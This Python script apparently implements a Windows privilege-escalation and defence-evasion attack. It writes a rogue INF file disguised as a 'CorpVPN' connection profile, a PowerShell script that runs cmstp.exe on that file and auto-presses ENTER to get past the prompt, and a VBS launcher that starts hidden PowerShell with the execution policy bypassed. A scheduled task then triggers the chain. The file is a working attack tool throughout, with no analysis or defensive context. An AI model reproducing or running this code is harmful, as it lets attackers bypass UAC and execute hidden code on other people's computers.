import os
import subprocess
import time
import sys

def run_command(command, wait=True):
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = result.stdout.decode(errors='replace')
    stderr = result.stderr.decode(errors='replace')
    return result.returncode, stdout, stderr

def create_inf_file():
    temp_folder = os.getenv('TEMP')
    inf_content = f"""
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
taskkill /IM cmstp.exe /F
cmd /c start {temp_folder}\\ddd.vbs

[CustInstDestSectionAllUsers]
49000,49001=AllUser_LDIDSection,7

[AllUser_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"""
    inf_file_path = os.path.join(temp_folder, 'corpvpn.inf')
    with open(inf_file_path, 'w') as f:
        f.write(inf_content.strip())
    return inf_file_path

def create_a_ps1():
    ps_code = '''
Add-Type -AssemblyName System.Windows.Forms

$InfFile = "$env:TEMP\\corpvpn.inf"

$ps = New-Object System.Diagnostics.ProcessStartInfo "c:\\windows\\system32\\cmstp.exe"
$ps.Arguments = "/au $InfFile"
$ps.UseShellExecute = $false
$ps.CreateNoWindow = $true

[System.Diagnostics.Process]::Start($ps) | Out-Null

do {
    Start-Sleep -Milliseconds 500
} until ((Get-Process -Name "cmstp" -ErrorAction SilentlyContinue) -ne $null)

[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
'''
    ps1_path = os.path.join(os.getenv('TEMP'), 'a.ps1')
    with open(ps1_path, 'w') as f:
        f.write(ps_code.strip())
    return ps1_path

def create_runner_vbs(ps1_path):
    vbs_code = f'''
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"{ps1_path}\"", 0, False
'''
    vbs_path = os.path.join(os.getenv('TEMP'), 'ddd.vbs')
    with open(vbs_path, 'w') as f:
        f.write(vbs_code.strip())
    return vbs_path

def main():
    run_command('schtasks /delete /tn "RunPowerShellScript" /f')

    # adım 1: .ps1 oluştur
    a_ps1_path = create_a_ps1()

    # adım 2: .vbs üzerinden .ps1 çalıştıracak VBS oluştur
    ddd_vbs_path = create_runner_vbs(a_ps1_path)

    # adım 3: INF dosyasını oluştur
    inf_file_path = create_inf_file()

    # adım 4: VBS üzerinden başlat (schtasks artık ddd.vbs çalıştırıyor)
    if os.path.exists(ddd_vbs_path):
        returncode, stdout, stderr = run_command(
            f'schtasks /create /tn "RunPowerShellScript" /tr "wscript.exe {ddd_vbs_path}" /sc once /st 00:00 /f'
        )
        if returncode != 0:
            print(f"Failed to create task 'RunPowerShellScript': {stderr}")
            sys.exit(1)
        run_command('schtasks /run /tn "RunPowerShellScript"')
    else:
        print("VBS runner file does not exist.")

if __name__ == "__main__":
    main()
